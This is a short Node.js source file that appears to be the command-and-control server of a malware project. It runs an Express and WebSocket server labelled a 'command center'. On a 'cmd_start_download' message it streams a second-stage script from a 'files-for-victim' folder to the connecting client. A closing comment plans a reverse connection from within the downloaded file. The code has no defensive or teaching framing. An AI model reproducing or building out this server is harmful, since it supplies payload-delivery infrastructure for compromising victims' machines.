const http = require("http");
const fs = require("fs");
const express = require("express");
const Websocket = require("ws");

const PORT = 9000;
const app = express();
const server = http.createServer(app);
const websocketServer = new Websocket.Server({ server });

function decode1(data) {
  return JSON.parse(data);
}

websocketServer.on("connection", (w) => {
  console.log("client connected");

  w.on("message", (message) => {
    if (decode1(message) === "cmd_start_download") {
      const filePath = "./files-for-victim/2.js";
      const fileSize = fs.statSync(filePath).size;
      w.send(JSON.stringify(fileSize));
      const stream = fs.createReadStream(filePath);
      let bytesSent = 0;
      stream.on("data", (data) => {
        bytesSent += data.length;
        const p = ((bytesSent / fileSize) * 100).toFixed(2);
        w.send(data);
        w.send(JSON.stringify({ p: p }));
      });
      stream.on("end", () => {
        w.send(JSON.stringify({ p: 100 }));
        w.close();
      });
      stream.on("error", (error) => {
        w.close();
      });
    }
    console.log("msg:", decode1(message));
  });
  w.on("close", () => {
    console.log("client disconnected");
  });
});

server.listen(PORT, () => {
  console.log(`command center running on port ${PORT}`);
});

// TODO: Create new reverse connection from whithin the downloaded file
